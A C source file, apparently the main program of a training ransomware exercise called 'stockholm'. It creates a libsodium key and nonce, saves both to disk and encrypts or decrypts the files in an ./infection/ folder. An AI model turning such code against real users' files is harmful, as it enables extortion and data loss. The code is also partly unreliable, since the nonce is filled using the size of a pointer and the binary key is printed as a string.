#include "stockholm.h"

int	reverse = 0;
int	silent = 0;

void	writeKey(struct cryptFile *data)
{
	unsigned int key_size = crypto_secretbox_KEYBYTES;  
	
	(*data).key = malloc(key_size + 1);
	(*data).nonce = malloc(crypto_secretbox_NONCEBYTES + 1);

	bzero((*data).key, key_size + 1);
	bzero((*data).nonce, crypto_secretbox_NONCEBYTES + 1);

	randombytes_buf((*data).nonce, sizeof((*data).nonce));
	crypto_secretbox_keygen((*data).key);


	// printf("key : ");
	// for (unsigned int i = 0; i < key_size; i++)
	// 	printf("%02x", (*data).key[i]);
	// printf("\n");

	// printf("nonce : ");
	// for (unsigned int i = 0; i < crypto_secretbox_NONCEBYTES; i++)
	// 	printf("%02x", (*data).nonce[i]);
	// printf("\n");

	printf("%s\n", (*data).key);
	printf("%s\n", (*data).nonce);

	FILE *fp = fopen("key.crypt", "wb");
	if (fp == NULL)
	{
		printf("Error: fopen() failed\n");
		return ;
	}
	
	fwrite((*data).key, key_size, 1, fp);
	fclose(fp);

	fp = fopen("nonce.crypt", "wb");
	if (fp == NULL)
	{
		printf("Error: fopen() failed\n");
		return ;
	}

	fwrite((*data).nonce, crypto_secretbox_NONCEBYTES, 1, fp);
	fclose(fp);
}

int		main(int argc, char *argv[], char *env[])
{
	(void)env;
	if (argc > 3)
	{
		printf("%s", DEFAULT_HELP);
		exit(0);
	}
	
	if (sodium_init() == -1)
	{
		printf("Error: sodium_init() failed\n");
		return (1);
	}
	
	if (argc > 1)
		optionprog(argv[1]);

	struct linkedFile *file = openFile();
	if (!file)
	{
		printf("Nothing to encrypt in the ./infection/\n");
		exit(0);
	}

	struct cryptFile data;
	if (reverse == 0)
	{
		writeKey(&data); // write key and nonce in key.crypt and nonce.crypt
		printf("%s\n", FILE_DELETED);
	}

	
	/*	Print linked list
	for (struct linkedFile *tmp = file; tmp; tmp = tmp->next)
		printf("name : %s\n", tmp->file);
	*/
	if (reverse)
		decrypt(file);
	else
		encrypt(file, data);
	clearlist(&file);
	return (0);
}